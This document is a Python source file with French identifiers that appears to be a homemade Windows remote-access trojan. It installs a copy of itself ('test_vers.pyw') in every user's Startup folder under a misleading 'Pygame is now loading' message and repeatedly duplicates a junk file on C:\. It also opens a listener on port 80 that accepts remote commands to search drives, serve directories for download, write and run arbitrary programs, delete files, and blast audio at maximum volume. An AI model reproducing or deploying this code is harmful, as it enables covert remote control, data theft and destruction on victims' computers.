import shutil
import os as os
import time as ti
import winsound

def test2(nom2,disquedur2,ilsontla2):
    for n in ilsontla2:
        for i in range(1,16):
            for dirpath, dirname, filename in os.walk(n + ":"):
                    if f"{i}.mp3" in filename:
                        newpasst = os.path.join(dirpath, f"{i}.mp3")
                        if newpasst == None:
                            continue
                        elif newpasst != None:
                            shutil.copy(newpasst,"C:\\")
                            break
                    else:
                        continue




def test(nom,disquedur,ilsontla):
    for n in ilsontla:
        for dirpath, dirname, filename in os.walk(n + ":"):
            if "test_vers.pyw" in filename:
                passt = os.path.join(dirpath, "test_vers.pyw")
                if passt == None:
                    continue
                elif passt != None:
                    shutil.copy(passt, disquedur + ":\\Users\\" + nom + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
                    print("Pygame is now loading !")
                    break
        

def serveur():
    nom_disque = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    disque_dispo = ""
    disque_dispo_liste = []
    for i in nom_disque:
        try:
            os.listdir(i + ":\\")
            disque_dispo += i + "|"
            disque_dispo_liste.append(i)
        except:
            continue
    import socket
    try:
        import pyautogui as plt
        import pygame as pyg
    except:
        return
    from http.server import HTTPServer,SimpleHTTPRequestHandler
    stop = False

    class NeuralHTTP(SimpleHTTPRequestHandler):
    
        def do_POST(self):
            self.send_response(200)
            self.send_header("Content-type", "apllication/json")
            self.end_headers()
            stop = True
            server.server_close()

    server = HTTPServer(("",1000),NeuralHTTP)
    serveur = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
    serveur.bind(("", 80))
    serveur.listen(5)
    typedoc = ["1","2","3","4","5","6","7","8","9","10","11","12","14","15"]
    while True:
        client, infosClient = serveur.accept()
        test_en = client.recv(10**8)	# Reçoit 255 octets. Vous pouvez changer pour recevoir plus de données
        test_en = test_en.decode("utf-8")

        if test_en == "fichier_find":
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            for n in disque_dispo_liste:
                for dirpath, dirname, filename in os.walk(n + ":"):
                    if test_en2 in filename:
                        passt = os.path.join(dirpath, test_en2)
                    if passt == None:
                        continue
                    elif passt != None:
                        client.send(passt.encode("utf-8"))
                    break

        elif test_en == "recup_fichier":
            client.send(disque_dispo.encode("utf-8"))
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            try:
                os.chdir(test_en2)
                client.close()
                try:
                    server.serve_forever()
                    server.server_close()
                except:
                    pass
            except:
                client.send("Erreur".encode("utf-8"))
                client.close()

        elif test_en == "send_fichier":
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            test_en3 = client.recv(10**8)
            file = open(test_en2, "wb")
            file.write(test_en3)
            file.close()
            client.close()

        elif test_en == "lancer":
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            if test_en2 == "True":
                test_en3 = client.recv(10**8)
                test_en3 = test_en3.decode("utf-8")
                test_en4 = client.recv(10**8)
                test_temps = client.recv(10**8)
                test_temps = test_temps.decode("utf-8")
                try:
                    file = open(test_en3, "wb")
                    file.write(test_en4)
                    ti.sleep(10)
                    if test_en3.endswith(".mp3"):
                        for i in range(100):
                            plt.press("volumeup")
                        pyg.init()
                        pyg.mixer.music.load(test_en3)
                        pyg.mixer.music.play()
                        ti.sleep(int(test_temps))
                    else:
                        os.system(test_en3)
                    client.close()
                except:
                    client.close()
            else:
                try:
                    if test_en2.endswith(".mp3"):
                        for i in range(100):
                            plt.press("volumeup")
                        pyg.init()
                        pyg.mixer.music.load(test_en2)
                        pyg.mixer.music.play()
                        ti.sleep(int(test_temps))
                        os.remove(test_en3)
                    else:
                        os.system(test_en2)
                    client.close()
                except:
                    client.close()

        elif test_en == "supp_fichier":
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            try:
                os.remove(test_en2)
                client.close()
            except:
                client.close()

        elif test_en == "cmd":
            test_en2 = client.recv(10**8)
            test_en2 = test_en2.decode("utf-8")
            try:
                os.remove(test_en2)
                client.close()
            except:
                client.close()
        
        elif test_en == "beep":
            HZ = client.recv(10**8)
            HZ = int(HZ)
            temps = client.recv(10**8)
            temps = int(temps)
            for i in range(100):
                plt.press("volumeup")
            winsound.Beep(HZ,temps)
            client.close()
        client.close()

    serveur.close()
    return 0

def start_test():
    nom_disque = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    New_disque = []
    disque_dispo = []
    supprimer = ["All Users","Default User","Public","desktop.ini","Default"]
    New_disque2 = []
    for i in nom_disque:
        try:
            os.listdir(i + ":\\")
            disque_dispo.append(i)
        except:
            continue

    for m in nom_disque:
        try:
            os.listdir(m + ":\\")
            if "Users" in os.listdir(m + ":\\"):
                New_disque.append(m)
        except:
            continue

    for p in New_disque:
        if "Users" in os.listdir(p + ":\\"):
            temp_disque = os.listdir(p + ":\\Users")
            for n in supprimer:
                if n in temp_disque:
                    temp_disque.remove(n)
            temp_disque.append(p)
            New_disque2.append(temp_disque)
        else:
            continue

    for p in New_disque2:
        if len(os.listdir(p[-1] + ':\\')) > 5:
            for w in range(len(p)-1):
                nom_chemin =  p[-1] + ":" + '\\' + "Users" + "\\" + p[w] + "\\" + "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                try:
                    if "test_vers.pyw" not in os.listdir(nom_chemin):
                        test(p[w],p[-1],disque_dispo)
                        test2(p[w],p[-1],disque_dispo)
                    if "coucou" not in os.listdir(p[-1] + ':\\'):
                        fichier = open("C:\\coucou","x")
                        for i in range(5):
                            fichier.write("coucou")
                        fichier.close()
                    else:
                        fichier = open("C:\\coucou","r")
                        coucou_liste = fichier.readlines()
                        fichier.close()
                        fichier = open("C:\\coucou","a")
                        for b in range(len(coucou_liste)):
                            for h in range(5):
                                try:
                                    fichier.write(coucou_liste[b])
                                except:
                                    fichier.close()
                        fichier.close()
                        serveur()
                except FileNotFoundError:
                    continue
    return 0

#start_test()
serveur()